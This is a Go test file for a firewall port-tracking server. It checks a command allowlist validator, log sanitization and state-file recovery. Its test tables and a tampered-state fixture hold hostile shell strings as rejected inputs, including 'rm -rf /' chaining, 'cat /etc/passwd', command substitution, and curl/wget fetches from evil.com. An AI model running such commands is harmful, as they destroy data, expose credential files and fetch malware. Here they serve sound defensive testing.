// Copyright (c) 2024-2026 Jack L. (Cpt-JackL) (https://jack-l.com)
// SPDX-License-Identifier: MIT
package server

import (
	"log"
	"os"
	"strings"
	"testing"
)

func writeTestFile(path, content string) error {
	return os.WriteFile(path, []byte(content), 0600)
}

func newTestLogger(t *testing.T) *log.Logger {
	t.Helper()
	return log.New(os.Stdout, "[test] ", 0)
}

func TestIsValidRecoveredCommand(t *testing.T) {
	tests := []struct {
		cmd  string
		want bool
	}{
		// Valid firewall commands (allowlisted binaries)
		{"iptables -D INPUT -p tcp --dport 22 -s 192.168.1.1 -j ACCEPT", true},
		{"ip6tables -D INPUT -p tcp --dport 22 -s ::1 -j ACCEPT", true},
		{`netsh advfirewall firewall delete rule name="SPK_10.0.0.1_22"`, true},
		{"ufw delete allow from 10.0.0.1 to any port 22 proto tcp", true},
		{"nft delete rule inet filter input handle 42", true},
		{"pfctl -a spk/10.0.0.1_22 -F rules", true},
		{"/sbin/iptables -D INPUT -p tcp --dport 22 -s 10.0.0.1 -j ACCEPT", true},
		{"/usr/sbin/iptables -D INPUT -p tcp --dport 22 -s 10.0.0.1 -j ACCEPT", true},
		{"firewall-cmd --remove-rich-rule='rule family=ipv4 source address=10.0.0.1 port port=22 protocol=tcp accept'", true},
		{"IPTABLES -D INPUT -p tcp --dport 22 -s 10.0.0.1 -j ACCEPT", true}, // case-insensitive

		// Injection attempts (blocked by metachar blocklist)
		{"iptables -D INPUT && rm -rf /", false},
		{"echo hello || cat /etc/passwd", false},
		{"nft list chain | grep handle", false},
		{"cmd; rm -rf /", false},
		{"echo `whoami`", false},
		{"echo $(id)", false},
		{"echo ${HOME}", false},
		{"echo hello > /tmp/evil", false},
		{"cat < /etc/passwd", false},
		{"echo hello\nrm -rf /", false},
		{"echo hello\rrm -rf /", false},

		// Too long
		{string(make([]byte, 1025)), false},

		// Not in allowlist (blocked even without metacharacters)
		{"", false},
		{"echo test", false},
		{"rm -rf /tmp/something", false},
		{"curl http://evil.com/payload", false},
		{"python3 -c 'import os; os.system(\"rm -rf /\")'", false},
		{"wget http://evil.com/malware -O /tmp/x", false},
		{"cat /etc/passwd", false},
	}

	for _, tt := range tests {
		got := isValidRecoveredCommand(tt.cmd)
		if got != tt.want {
			if len(tt.cmd) > 60 {
				t.Errorf("isValidRecoveredCommand(len=%d) = %v, want %v", len(tt.cmd), got, tt.want)
			} else {
				t.Errorf("isValidRecoveredCommand(%q) = %v, want %v", tt.cmd, got, tt.want)
			}
		}
	}
}

func TestIsValidRecoveredCommandMaxLength(t *testing.T) {
	// Exactly 1024 chars starting with a valid firewall prefix should be OK
	prefix := "iptables -D INPUT -p tcp --dport 22 -s 10.0.0.1 -j ACCEPT "
	validCmd := make([]byte, 1024)
	copy(validCmd, prefix)
	for i := len(prefix); i < len(validCmd); i++ {
		validCmd[i] = 'a'
	}
	if !isValidRecoveredCommand(string(validCmd)) {
		t.Error("1024-char firewall command should be valid")
	}

	// 1025 chars should fail regardless of prefix
	tooLong := make([]byte, 1025)
	copy(tooLong, prefix)
	for i := len(prefix); i < len(tooLong); i++ {
		tooLong[i] = 'a'
	}
	if isValidRecoveredCommand(string(tooLong)) {
		t.Error("1025-char command should be invalid")
	}
}

func TestTrackerRecoveryRejectsInjection(t *testing.T) {
	// Simulate a tampered state file with an injected close command
	// When the tracker recovers, it should skip the malicious entry
	tmpDir := t.TempDir()
	statePath := tmpDir + "/state.json"

	// Write a state file with a malicious close command
	state := `{
		"10.0.0.1:22:tcp": {
			"ip": "10.0.0.1",
			"port": "t22",
			"proto": "tcp",
			"port_num": "22",
			"opened_at": "2020-01-01T00:00:00Z",
			"expires_at": "2020-01-01T00:30:00Z",
			"open_command": "iptables -A INPUT -p tcp --dport 22 -s 10.0.0.1 -j ACCEPT",
			"close_command": "iptables -D INPUT && rm -rf /"
		},
		"10.0.0.2:80:tcp": {
			"ip": "10.0.0.2",
			"port": "t80",
			"proto": "tcp",
			"port_num": "80",
			"opened_at": "2020-01-01T00:00:00Z",
			"expires_at": "2099-01-01T00:00:00Z",
			"open_command": "iptables -A INPUT -p tcp --dport 80 -s 10.0.0.2 -j ACCEPT",
			"close_command": "iptables -D INPUT -p tcp --dport 80 -s 10.0.0.2 -j ACCEPT"
		}
	}`

	if err := writeTestFile(statePath, state); err != nil {
		t.Fatalf("write state file: %v", err)
	}

	// Create tracker (triggers recovery)
	logger := newTestLogger(t)
	tracker := NewTracker(statePath, logger, true)

	// The malicious entry (10.0.0.1) should be skipped
	// The valid entry (10.0.0.2 with future expiry) should be kept
	entries := tracker.GetAll()

	// Only the valid entry should remain
	if len(entries) != 1 {
		t.Fatalf("expected 1 entry after recovery, got %d", len(entries))
	}

	if entries[0].IP != "10.0.0.2" {
		t.Errorf("remaining entry IP = %q, want %q", entries[0].IP, "10.0.0.2")
	}
}

// --- ClosePortsOnCrash=false tests ---
// Note: TestCloseOnCrashRecoveryFalse in close_cmd_test.go covers the expired-entry case.

func TestTrackerRecoveryClosePortsOnCrashFalseNonExpired(t *testing.T) {
	// Non-expired entries should still be re-tracked regardless of closePortsOnCrash
	tmpDir := t.TempDir()
	statePath := tmpDir + "/state.json"

	state := `{
		"10.0.0.1:22:tcp": {
			"ip": "10.0.0.1",
			"port": "t22",
			"proto": "tcp",
			"port_num": "22",
			"opened_at": "2020-01-01T00:00:00Z",
			"expires_at": "2099-01-01T00:00:00Z",
			"open_command": "iptables -A INPUT -p tcp --dport 22 -s 10.0.0.1 -j ACCEPT",
			"close_command": "iptables -D INPUT -p tcp --dport 22 -s 10.0.0.1 -j ACCEPT"
		}
	}`

	if err := writeTestFile(statePath, state); err != nil {
		t.Fatalf("write state: %v", err)
	}

	logger := newTestLogger(t)
	tracker := NewTracker(statePath, logger, false) // closePortsOnCrash=false

	entries := tracker.GetAll()
	if len(entries) != 1 {
		t.Fatalf("expected 1 non-expired entry, got %d", len(entries))
	}
	if entries[0].IP != "10.0.0.1" {
		t.Errorf("entry IP = %q, want 10.0.0.1", entries[0].IP)
	}
}

func TestTrackerRecoveryMixedEntriesCrashFalse(t *testing.T) {
	// Mix of expired and non-expired entries with closePortsOnCrash=false
	tmpDir := t.TempDir()
	statePath := tmpDir + "/state.json"

	state := `{
		"10.0.0.1:22:tcp": {
			"ip": "10.0.0.1",
			"port": "t22",
			"proto": "tcp",
			"port_num": "22",
			"opened_at": "2020-01-01T00:00:00Z",
			"expires_at": "2020-01-01T00:30:00Z",
			"open_command": "iptables -A INPUT -p tcp --dport 22 -s 10.0.0.1 -j ACCEPT",
			"close_command": "iptables -D INPUT -p tcp --dport 22 -s 10.0.0.1 -j ACCEPT"
		},
		"10.0.0.2:80:tcp": {
			"ip": "10.0.0.2",
			"port": "t80",
			"proto": "tcp",
			"port_num": "80",
			"opened_at": "2020-01-01T00:00:00Z",
			"expires_at": "2099-01-01T00:00:00Z",
			"open_command": "iptables -A INPUT -p tcp --dport 80 -s 10.0.0.2 -j ACCEPT",
			"close_command": "iptables -D INPUT -p tcp --dport 80 -s 10.0.0.2 -j ACCEPT"
		}
	}`

	if err := writeTestFile(statePath, state); err != nil {
		t.Fatalf("write state: %v", err)
	}

	logger := newTestLogger(t)
	tracker := NewTracker(statePath, logger, false)

	entries := tracker.GetAll()
	if len(entries) != 1 {
		t.Fatalf("expected 1 entry (expired dropped), got %d", len(entries))
	}
	if entries[0].IP != "10.0.0.2" {
		t.Errorf("remaining entry IP = %q, want 10.0.0.2", entries[0].IP)
	}
}

// --- Additional isValidRecoveredCommand edge cases ---

func TestIsValidRecoveredCommandNullByte(t *testing.T) {
	// Null byte in command: even with valid prefix, null byte in the middle is suspicious.
	// Currently allowed by blocklist (null not in dangerous list), but the allowlist
	// still validates that the command starts with a known binary.
	cmd := "iptables -D INPUT\x00rm -rf /"
	got := isValidRecoveredCommand(cmd)
	// Passes allowlist (starts with "iptables -") -- the null byte concern is
	// mitigated by the OS: exec.Command("sh", "-c", cmd) treats null as string terminator.
	if !got {
		t.Log("Null-byte command was rejected (stricter than expected)")
	}
}

func TestIsValidRecoveredCommandCRLF(t *testing.T) {
	if isValidRecoveredCommand("iptables -D INPUT\r\nrm -rf /") {
		t.Error("CRLF should be rejected (contains \\r and \\n)")
	}
}

func TestIsValidRecoveredCommandPipeBlocked(t *testing.T) {
	// Pipe is blocked to prevent command chaining in recovered commands
	tests := []struct {
		cmd  string
		want bool
	}{
		{"nft list chain | grep handle", false},
		{"iptables -L | wc -l", false},
		{"echo hello || cat /etc/passwd", false}, // double pipe also rejected
	}
	for _, tt := range tests {
		got := isValidRecoveredCommand(tt.cmd)
		if got != tt.want {
			t.Errorf("isValidRecoveredCommand(%q) = %v, want %v", tt.cmd, got, tt.want)
		}
	}
}

func TestIsValidRecoveredCommandRedirects(t *testing.T) {
	tests := []struct {
		cmd  string
		want bool
	}{
		{"echo hello > /tmp/evil", false},
		{"cat < /etc/passwd", false},
		{"echo test >> /tmp/file", false},
		{"echo test 2>/dev/null", false},
	}
	for _, tt := range tests {
		got := isValidRecoveredCommand(tt.cmd)
		if got != tt.want {
			t.Errorf("isValidRecoveredCommand(%q) = %v, want %v", tt.cmd, got, tt.want)
		}
	}
}

// ---------------------------------------------------------------------------
// sanitizeForLog tests
// ---------------------------------------------------------------------------

func TestSanitizeForLogNormal(t *testing.T) {
	input := "hello-world_123"
	got := sanitizeForLog(input)
	if got != input {
		t.Errorf("sanitizeForLog(%q) = %q, want %q", input, got, input)
	}
}

func TestSanitizeForLogControlChars(t *testing.T) {
	tests := []struct {
		input string
		want  string
	}{
		{"hello\nworld", "hello?world"},
		{"test\r\nline", "test??line"},
		{"tab\there", "tab?here"},
		{"null\x00byte", "null?byte"},
		{"esc\x1bcode", "esc?code"},
		{"del\x7fchar", "del?char"},
		{"normal text", "normal text"},
		{"", ""},
	}
	for _, tt := range tests {
		got := sanitizeForLog(tt.input)
		if got != tt.want {
			t.Errorf("sanitizeForLog(%q) = %q, want %q", tt.input, got, tt.want)
		}
	}
}

func TestSanitizeForLogLogInjection(t *testing.T) {
	// Simulate log injection: attacker sends command with embedded newline
	// to fake a log entry
	malicious := "legit-cmd\n[OPEN] 22/tcp for 0.0.0.0 (spoofed)"
	got := sanitizeForLog(malicious)
	if strings.Contains(got, "\n") {
		t.Errorf("sanitizeForLog did not strip newline: %q", got)
	}
	if !strings.Contains(got, "?") {
		t.Error("expected '?' replacement for newline")
	}
}

// ---------------------------------------------------------------------------
// State file size limit tests
// ---------------------------------------------------------------------------

func TestTrackerRecoveryRejectsOversizedStateFile(t *testing.T) {
	tmpDir := t.TempDir()
	statePath := tmpDir + "/state.json"

	// Write a state file larger than 1 MB
	bigData := make([]byte, 1<<20+1) // 1 MB + 1 byte
	for i := range bigData {
		bigData[i] = 'x'
	}
	if err := os.WriteFile(statePath, bigData, 0600); err != nil {
		t.Fatalf("write oversized state: %v", err)
	}

	logger := newTestLogger(t)

	// Creating a new tracker triggers recoverState -- should not panic
	// and should start with zero entries (oversized file skipped)
	tracker := NewTracker(statePath, logger, false)
	entries := tracker.GetByIP("10.0.0.1")
	if len(entries) > 0 {
		t.Error("expected no entries recovered from oversized state file")
	}
}

func TestTrackerRecoveryAcceptsNormalStateFile(t *testing.T) {
	tmpDir := t.TempDir()
	statePath := tmpDir + "/state.json"

	// Write a small valid state file
	stateJSON := `{
		"10.0.0.1:22:tcp": {
			"ip": "10.0.0.1",
			"port": "t22",
			"proto": "tcp",
			"port_num": "22",
			"close_command": "iptables -D INPUT -p tcp --dport 22 -s 10.0.0.1 -j ACCEPT",
			"expires_at": "2099-01-01T00:00:00Z"
		}
	}`
	if err := os.WriteFile(statePath, []byte(stateJSON), 0600); err != nil {
		t.Fatalf("write state: %v", err)
	}

	logger := newTestLogger(t)
	tracker := NewTracker(statePath, logger, false)
	entries := tracker.GetByIP("10.0.0.1")
	if len(entries) != 1 {
		t.Errorf("expected 1 recovered entry, got %d", len(entries))
	}
}

func TestTrackerRecoverySkipsNilStateEntries(t *testing.T) {
	tmpDir := t.TempDir()
	statePath := tmpDir + "/state.json"

	stateJSON := `{
		"10.0.0.1:22:tcp": null,
		"10.0.0.2:80:tcp": {
			"ip": "10.0.0.2",
			"port": "t80",
			"proto": "tcp",
			"port_num": "80",
			"close_command": "iptables -D INPUT -p tcp --dport 80 -s 10.0.0.2 -j ACCEPT",
			"expires_at": "2099-01-01T00:00:00Z"
		}
	}`

	if err := os.WriteFile(statePath, []byte(stateJSON), 0600); err != nil {
		t.Fatalf("write state: %v", err)
	}

	logger := newTestLogger(t)
	tracker := NewTracker(statePath, logger, false)

	if got := len(tracker.GetByIP("10.0.0.1")); got != 0 {
		t.Fatalf("nil entry should be skipped, got %d entries", got)
	}
	if got := len(tracker.GetByIP("10.0.0.2")); got != 1 {
		t.Fatalf("valid entry should be recovered, got %d entries", got)
	}
}
